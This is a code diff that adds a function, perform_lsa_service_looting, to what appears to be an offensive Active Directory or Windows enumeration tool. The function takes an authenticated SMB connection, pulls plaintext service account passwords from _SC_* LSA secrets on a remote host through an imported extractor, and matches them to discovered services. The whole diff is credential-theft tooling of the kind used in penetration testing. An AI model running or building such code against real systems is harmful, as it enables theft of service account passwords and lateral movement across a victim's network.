@@ -596,6 +596,80 @@ def perform_service_enumeration(
     return rows
 
 
+def perform_lsa_service_looting(
+    target: str,
+    smb: Any,
+    host: str,
+    service_rows: List[Any],
+    *,
+    kerberos: bool = False,
+    dc_ip: Optional[str] = None,
+    debug: bool = False,
+) -> List[str]:
+    """
+    Extract plaintext passwords from _SC_* LSA secrets for discovered services.
+
+    Maps extracted credentials back to ServiceRow objects, populating
+    decrypted_password fields.
+
+    Args:
+        target: Target identifier (for logging)
+        smb: Authenticated SMB connection
+        host: Server FQDN
+        service_rows: List of ServiceRow instances to match credentials against
+        kerberos: Kerberos auth being used
+        dc_ip: DC hostname for Kerberos
+        debug: Enable debug output
+
+    Returns:
+        Output lines for credential display
+    """
+    from ..lsa.extractor import extract_service_credentials
+
+    out_lines: List[str] = []
+
+    # Collect service names for targeted extraction
+    service_names = {row.service_name for row in service_rows if row.service_name}
+
+    try:
+        credentials = extract_service_credentials(
+            smb, host,
+            service_names=service_names,
+            kerberos=kerberos,
+            dc_host=dc_ip,
+        )
+    except Exception as e:
+        warn(f"{target}: LSA service credential extraction failed: {e}")
+        if debug:
+            traceback.print_exc()
+        return out_lines
+
+    if not credentials:
+        return out_lines
+
+    # Map credentials back to service rows
+    matched = 0
+    for cred in credentials:
+        for row in service_rows:
+            if cred.service_name and cred.service_name == row.service_name:
+                row.decrypted_password = cred.password
+                matched += 1
+                break
+            elif cred.account and row.start_name:
+                # Fall back to account name matching
+                cred_user = cred.account.split("\\")[-1].lower() if "\\" in cred.account else cred.account.lower()
+                row_user = row.start_name.split("\\")[-1].lower() if "\\" in row.start_name else row.start_name.lower()
+                if cred_user == row_user:
+                    row.decrypted_password = cred.password
+                    matched += 1
+                    break
+
+    if matched:
+        good(f"{target}: Matched {matched} LSA credential(s) to service accounts")
+
+    return out_lines
+
+
 def sort_tasks_by_priority(lines: List[str]) -> List[str]:
     """
     Sort task blocks by priority: TIER-0 > PRIV > TASK.
